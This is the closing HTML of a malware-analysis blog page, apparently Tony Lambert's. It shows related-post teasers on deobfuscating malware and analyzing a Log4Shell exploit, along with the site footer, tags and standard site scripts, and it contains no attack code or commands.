2021-09-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Smarter, Not Harder: Getting Malware to Help You Analyze It</h3><div class="text-muted small"><p> When analyzing even non-advanced malware nowadays it’s common to find pretty heavy levels of obfuscation within samples. PowerShell and .NET malware for Windows can be obfuscated easily using vario...</p></div></div></a></div><div class="card"> <a href="/analyzing-log4shell-muhstik/"><div class="card-body"> <em class="timeago small" data-ts="1639267200" > 2021-12-12 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Analyzing a Log4Shell log4j Exploit from Muhstik</h3><div class="text-muted small"><p> In this post I set out to analyze a simple chunk of Log4Shell log4j exploit code to see how it works. Finding the Exploit I wasn’t running a honeypot or anything, I just figured I could rustle ar...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/net-downloader-originlogger/" class="btn btn-outline-primary" prompt="Older"><p>.NET Downloader Leading to OriginLogger</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-THRVSJGH6S"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-THRVSJGH6S'); }); </script>
